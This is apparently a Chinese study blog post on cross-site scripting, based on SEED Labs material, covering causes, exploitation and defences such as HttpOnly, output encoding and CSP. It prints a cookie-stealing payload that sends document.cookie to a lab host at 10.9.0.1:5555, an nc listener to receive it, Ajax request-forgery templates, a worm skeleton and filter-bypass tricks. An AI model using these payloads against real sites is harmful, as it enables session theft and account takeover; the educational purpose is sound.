    <content type="html"><![CDATA[<img src="/2022/04/15/XSS/web.jpg" class="" title="WEB Security"><h2 id="跨站脚本攻击（XSS-Cross-Site-Script）"><a href="#跨站脚本攻击（XSS-Cross-Site-Script）" class="headerlink" title="跨站脚本攻击（XSS: Cross-Site Script）"></a>跨站脚本攻击（XSS: Cross-Site Script）</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>从名称上来看，这个漏洞似乎和跨站有关系，但其实这是对其命名时的历史原因，跨不跨站的已经无所谓了，重要的是脚本会被执行。</p><p>出现的原因：很多Web应用需要将用户的输入显示在后续的页面中。例如，我们在某某hub网站注册一个账号，其中你的昵称&#x2F;用户名将会显示在登陆后的页面中。</p><p>对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。这个漏洞的本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下恶意构造的输入不再被当作数据显示，而是被当作一段代码被客户端的浏览器执行。</p><p>XSS的利用可以做到javascript可以做的任何事情。例如可以盗取cookie，进而使用这个cookie进行恶意操作。还可以制作蠕虫病毒进行自我复制。</p><p>这种漏洞是由用户输入引发的。尤其在一些用户的输入既可以展示给自己，也可以展示给别人的应用中危害更大。所以常见于社交媒体，留言系统等网站。</p><h3 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h3><ol><li>使用 <code>alert</code> 函数进行弹窗，没什么实际作用（恐吓？）。我有时候会用 <code>alert</code> 来调试payload，或者单纯用来测试XSS漏洞。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;nmsl&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>使用 <code>document.cookie</code> 读取cookie。</p></li><li><p>使用如下代码在DOM中嵌入一个对img的加载，从而用GET方法将cookie发送到指定主机，escape函数用来编码。</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(’&lt;img src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//10.9.0.1:5555?c=’</span><br>                       + <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) + ’   &gt;’);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>对应的，在需要接收的主机上开启 <code>nc</code> ，<code>-l</code> 表示listen模式，<code>-nv</code> 表示给出更多输出，<code>-k</code> 表示当结束一次连接以后，继续监听下一次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure><ol start="4"><li>通过Ajax在受害者的浏览器上发送伪造请求，GET以及POST请求都可以进行发送，这种攻击不需要访问受害者的cookie，因为代码运行在受害者的浏览器，进行发送时，浏览器会自动将cookie附加在请求头中。</li></ol><p>GET请求：（注意：GET请求的参数用 <code>&amp;</code> 符号连接在url后面）</p><p>使用 <code>window.onload</code> 函数是要在当前页面加载完毕之后再执行这个函数。因为如果没有加载完毕，DOM还没有构造好，一些参数可能还没有初始化而导致攻击失败。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;param1=&quot;</span>+p1; <br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;param2=&quot;</span>+p2;  <span class="hljs-comment">//Construct the HTTP request</span><br><span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.xxx.com?&quot;</span>+ts+token;  <span class="hljs-comment">//FILL IN</span><br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125; <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>POST请求：（POST请求的参数需要放在content区域）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-comment">//JavaScript code to access param</span><br><span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;p1=&quot;</span>+p1;<br><span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;p2=&quot;</span>+p2;<br><span class="hljs-comment">//Construct the content of your url.</span><br><span class="hljs-keyword">var</span> content=...;<br><span class="hljs-keyword">var</span> sendurl=...;<br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//Create and send Ajax request</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                      <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>&#125; &lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="5"><li>使用DOM中的方法构造蠕虫。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;  <br><span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;  <br><span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>; <br><span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag); <br><span class="hljs-title function_">alert</span>(jsCode);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="6"><li>收集用户信息（除了cookie以外）</li></ol><p>识别浏览器：最直接的方法就是读取浏览器的userAgent对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">userAgent</span>);<br></code></pre></td></tr></table></figure><p>可以得到操作系统版本，浏览器版本等等主机信息。<br>但是userAgent是可以被伪造的，有一些firefox的插件可以伪造虚假的userAgent。此时我们可以利用不同浏览器之间的细微差异来辨别不同的浏览器。</p><p>识别用户安装的软件（浏览器插件）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">plugins</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br></code></pre></td></tr></table></figure><p>获取用户的用户IP地址：<br>如果用户安装的JRE环境，就可以通过调用JavaApplet接口获取本地IP地址，也可以获取外网IP地址。</p><p>XSS钓鱼：利用js在当前页面上画出一个登录框，诱导用户去输入正确的凭据，然后发送至黑客的服务器上。</p><ol start="7"><li>Payload构造技巧：</li></ol><p>利用字符编码：对于使用GBK&#x2F;GB2312编码的字符，可以使用<code>%c1</code>绕过对双引号的转义。因为<code>%c1\</code> 会被解析成为一个unicode字符。</p><p>绕过长度限制：调用远程js文件；如果有两处XSS的话，可以使用注释符打通两个input框。</p><p>利用相对路径：使用 <code>&lt;base&gt;</code> 标签，将使用相对路径的资源&#x2F;脚本进行劫持。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>HttpOnly方法</p><p>简单来说，就是服务器在返回cookie时，将cookie设置了HttpOnly标签，使得javascript代码无法读取cookie值。但是严格来说其实这个方法并不是防御XSS的，而是防御XSS漏洞发生后的利用过程。虽然此时javascript无法读取到cookie，但是还是可以向同源的网址用ajax请求来进行模拟POST&#x2F;GET过程。</p></li><li><p>输入检查</p><p>前端js检查：可以阻挡大部分误操作的正常用户，但是可以被绕过。<br>后端检查：特殊字符的过滤&#x2F;编码，敏感词黑名单。</p></li><li><p>输出检查</p><p>比如将标签 <code>&lt; &gt;</code> 转化成 <code>&amp;lt &amp;gt</code>；<br><code>&amp;</code> 转化为 <code>&amp;amp</code>；<br><code>&quot;</code> 转化为 <code>&amp;quot</code>；<br><code>&#39;</code> 转化为 <code>&amp;#x27</code>；</p></li><li><p>使用CSP(Content Security Policy)</p><p>服务器在返回的Header中可以指定只有带特定 <code>nonce</code> 的script代码块才可以被执行，或者指定域名的远程js代码才可以被执行。</p></li></ol><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ol><li>SEED Labs [<a href="https://seedsecuritylabs.org]">https://seedsecuritylabs.org]</a>.</li><li>Web Security: A white hat perspective, Hanqing Wu.</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
